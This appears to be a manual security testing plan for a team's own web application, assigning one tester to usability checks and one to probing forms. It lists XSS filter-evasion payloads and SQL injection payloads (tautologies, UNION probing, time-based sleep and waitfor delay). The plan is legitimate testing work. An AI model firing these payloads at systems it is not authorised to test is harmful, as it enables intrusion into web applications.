## Intro

There will be two actors involved in two rounds of testing: SimpleUser and ComplexUser, and all testing will be done manually. In general, the tasks will be divided as follows: SimpleUser will be responsible for testing all page size-responsively and all forms with various normal data that will be predetermined by some rule, and ComplexUser will be responsible for testing all forms with various data/Payload XSS and SQLinjection and closely observing the response detail. The testing can be continuously, during the development process until the final phase on April 5-10, 2023. There are some rules to directive the testing process and how to record the testing results, so the testing will be `inflexible`.

The testing with SimpleUser, which attempts to test all forms with various normal data, tends to be more suitable for `black box testing`, where testing is done from the user's point of view or the use of the application without paying attention to internal implementation details. Meanwhile, the testing with ComplexUser, which attempts to test with data/Payload XSS and closely observe the response, tends to be more suitable for `grey box testing`, where testing is done with some knowledge of the design and structure of the application.

## Guideline for SimpleUser

1. Login with Google (Google Auth)

2. Explore the entire page

3. Test the responsiveness of the entire page

4. Test all forms repeatedly

5. Test all forms in various conditions.

## Guideline for ComplexUser

1. Manual Registration and Login

2. Manually test the register form repeatedly for SQLi and XSS vulnerabilities

3. Manually test the login form for SQLi and XSS vulnerabilities

4. Repeatedly test all forms in the CMS

5. Test all forms in various conditions.

## General Rules

1. ComplexUser and SimpleUser are not allowed to exchange information regarding the testing process and results.

2. ComplexUser and SimpleUser are not allowed to be in close proximity to each other while one or both are conducting testing.

3. Testing is conducted manually without the use of automated scripts.

4. If an error occurs during the testing process, testing must continue until it cannot be continued.

5. ComplexUser and SimpleUser must understand the format or guidelines for recording testing results and processes.

## Payload XSS

```
"-prompt(8)-"
'-prompt(8)-'
";a=prompt,a()//
';a=prompt,a()//
'-eval("window['pro'%2B'mpt'](8)")-'
"-eval("window['pro'%2B'mpt'](8)")-"
"onclick=prompt(8)>"@x.y
"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
<image/src/onerror=prompt(8)>
<img/src/onerror=prompt(8)>
<image src/onerror=prompt(8)>
<img src/onerror=prompt(8)>
<image src =q onerror=prompt(8)>
<img src =q onerror=prompt(8)>
</scrip</script>t><img src =q onerror=prompt(8)>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
```

## SQLinjection Payload

```
OR 1=1
OR 1=0
OR x=x
OR x=y
OR 1=1#

1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+

1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+

1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --

-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --

sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
```

## More Payload at : [PayloadBox Github](https://github.com/payloadbox)

## Example Report Table

| No  | Date   | URI/ Pages        | Input                       | Output          | Exp.                                    |
| --- | ------ | ----------------- | --------------------------- | --------------- | --------------------------------------- |
| 1   | 05 Feb | Add Contacts Form | "));waitfor delay '0:0:5'-- | SQL Error . . . | Lorem ipsum dolor sit amet consectetur. |
| 2   | 05 Feb | Add Contacts Form | "));waitfor delay '0:0:5'-- | SQL Error . . . | Lorem ipsum dolor sit amet consectetur. |
| 3   | 05 Feb | Add Contacts Form | "));waitfor delay '0:0:5'-- | SQL Error . . . | Lorem ipsum dolor sit amet consectetur. |
